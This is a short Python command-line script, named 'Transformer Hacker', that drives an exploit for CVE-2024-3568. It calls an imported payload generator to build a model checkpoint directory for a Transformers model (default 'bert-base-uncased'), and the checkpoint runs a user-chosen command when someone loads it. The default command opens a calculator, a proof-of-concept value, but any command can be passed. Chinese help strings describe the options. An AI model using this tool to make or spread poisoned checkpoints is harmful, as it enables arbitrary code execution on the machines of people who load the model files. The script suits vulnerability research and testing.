import argparse

from src.payload.CVE_2024_3568.payload_generator import generate_command_checkpoint
from src.utils.command_util import get_open_calc_command

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='Transformer Hacker')

    parser.add_argument('--directory', dest='directory',
                        help="""指定生成的checkpoint要保存到的目录""", default='./rce-checkpoint')

    parser.add_argument('--model', dest='model',
                        help="""指定使用的模型""", default='bert-base-uncased')

    parser.add_argument('--command', dest='command',
                        help="""指定要执行的命令""", default=get_open_calc_command())

    args = parser.parse_args()

    try:
        generate_command_checkpoint(directory_path=args.directory, model=args.model, command=args.command)
    except KeyboardInterrupt:
        print('Bye')
    except Exception as e:
        print('exception exception exception exception exception ')
        parser.print_help()
        raise e
